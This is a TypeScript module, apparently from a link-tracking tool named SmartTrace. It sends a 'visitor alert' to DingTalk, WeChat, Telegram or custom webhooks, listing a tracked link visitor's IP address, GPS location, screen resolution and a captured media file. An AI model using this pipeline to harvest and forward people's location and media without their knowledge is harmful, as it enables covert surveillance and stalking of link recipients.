import axios from "axios";
import { getSmtpSetting } from "./db";

export async function sendWebhookNotification(data: {
  linkId: string;
  ip: string;
  gps: string;
  resolution: string;
  filePath: string;
  createdAt: Date;
  userId?: number | null;
}) {
  if (!data.userId) return;
  const setting = await getSmtpSetting(data.userId);
  if (!setting || !setting.webhookUrl) return;

  const { webhookUrl, webhookType } = setting;
  const text = `🚨 [SmartTrace 访客提醒]
- 追踪编号: ${data.linkId}
- IP 地址: ${data.ip}
- GPS 定位: ${data.gps}
- 屏幕分辨率: ${data.resolution}
- 捕获时间: ${new Date(data.createdAt).toLocaleString()}
- 媒体文件: ${data.filePath}`;

  try {
    if (webhookType === "dingtalk") {
      await axios.post(webhookUrl, {
        msgtype: "text",
        text: { content: text },
      }, { timeout: 5000 });
    } else if (webhookType === "wechat") {
      await axios.post(webhookUrl, {
        msgtype: "text",
        text: { content: text },
      }, { timeout: 5000 });
    } else if (webhookType === "telegram") {
      // 适配 Telegram Bot API: https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>
      // 允许用户直接输入完整的 Telegram Bot API URL 或自定义 Webhook
      const targetUrl = webhookUrl.includes("?") ? `${webhookUrl}&text=${encodeURIComponent(text)}` : `${webhookUrl}?text=${encodeURIComponent(text)}`;
      await axios.get(targetUrl, { timeout: 5000 });
    } else {
      await axios.post(webhookUrl, { content: text }, { timeout: 5000 });
    }
    console.log(`[Webhook] Notification sent successfully via ${webhookType}`);
  } catch (error) {
    console.error("[Webhook] Failed to send webhook notification:", error);
  }
}
